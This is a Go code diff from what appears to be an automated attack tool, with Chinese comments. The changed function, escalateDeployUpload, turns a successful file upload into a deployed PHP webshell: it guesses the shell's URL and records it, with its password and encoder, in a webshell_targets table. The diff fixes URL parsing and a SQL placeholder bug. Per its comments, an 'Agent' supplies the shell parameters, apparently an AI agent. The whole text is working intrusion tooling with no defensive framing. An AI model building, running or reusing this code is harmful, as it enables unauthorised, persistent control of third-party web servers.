@@ -10,6 +10,7 @@ import (
 	"io"
 	"mime/multipart"
 	"net/http"
+	"net/url"
 	"strings"
 )
 
@@ -80,34 +81,44 @@ func (s *Server) escalateDeployUpload(ctx context.Context, targetURL string, par
 	// 推断 webshell URL（常见模式：上传目录 + 文件名）
 	shellURL := inferShellURL(uploadURL, resp, string(body))
 	if shellURL == "" {
-		shellURL = strings.TrimRight(targetURL, "/") + "/uploads/shell.php"
+		shellURL = urlOrigin(targetURL) + "/uploads/shell.php"
 	}
 
-	// 保存到 webshell 目标管理
+	// 保存到 webshell 目标管理（密码/编码由 Agent 生成的 shell_params 透传，
+	// 兜底 auto/raw/php）。占位符必须是 PG 的 $n —— 此前误用 ? 导致静默失败。
+	password, _ := params["shell_password"].(string)
+	encoder, _ := params["shell_encoder"].(string)
+	scriptType, _ := params["shell_script_type"].(string)
+	if password == "" {
+		password = "auto"
+	}
+	if encoder == "" {
+		encoder = "raw"
+	}
+	if scriptType == "" {
+		scriptType = "php"
+	}
+	name := strings.TrimPrefix(strings.TrimPrefix(urlOrigin(targetURL), "https://"), "http://")
+	if len(name) > 40 {
+		name = name[:40]
+	}
 	_, _ = s.m.PG().Exec(`INSERT INTO webshell_targets (group_name, name, url, password, encoder, script_type, note)
-		VALUES ('auto', ?, ?, 'auto', 'raw', 'php', 'auto_escalate 自动部署')
+		VALUES ('auto', $1, $2, $3, $4, $5, 'auto_escalate 自动部署')
 		ON CONFLICT DO NOTHING`,
-		"Auto "+targetURL[:30], shellURL)
+		name, shellURL, password, encoder, scriptType)
 
 	return shellURL, nil
 }
 
 // inferShellURL 从上传响应中推断 webshell URL。
 func inferShellURL(uploadURL string, resp *http.Response, body string) string {
-	// 常见模式 1：响应中包含文件路径
+	// 常见模式 1：响应中包含文件路径（uploads/xxx.php 等）
 	for _, pattern := range []string{"uploads/", "upload/", "files/", "static/", "data/"} {
 		if idx := strings.Index(body, pattern); idx >= 0 {
 			end := strings.IndexAny(body[idx:], "\"'< \n")
 			if end > 0 {
 				path := body[idx : idx+end]
-				base := strings.TrimRight(uploadURL, "/")
-				// 取域名部分
-				if schemeIdx := strings.Index(base, "://"); schemeIdx >= 0 {
-					if pathIdx := strings.Index(base[9:], "/"); pathIdx >= 0 {
-						base = base[:9+pathIdx]
-					}
-				}
-				return base + "/" + path
+				return strings.TrimRight(urlOrigin(uploadURL), "/") + "/" + path
 			}
 		}
 	}
@@ -116,4 +127,18 @@ func inferShellURL(uploadURL string, resp *http.Response, body string) string {
 		return loc
 	}
 	return ""
+}
+
+// urlOrigin 取 scheme://host[:port]，路径部分截掉——避免把 upload.php 拼进 shell URL。
+func urlOrigin(raw string) string {
+	if u, err := url.Parse(raw); err == nil && u.Host != "" {
+		return u.Scheme + "://" + u.Host
+	}
+	// 解析失败的兜底：手找第一个 '/' 在 '://' 之后的位置
+	if i := strings.Index(raw, "://"); i >= 0 {
+		if j := strings.Index(raw[i+3:], "/"); j >= 0 {
+			return raw[:i+3+j]
+		}
+	}
+	return strings.TrimRight(raw, "/")
 }
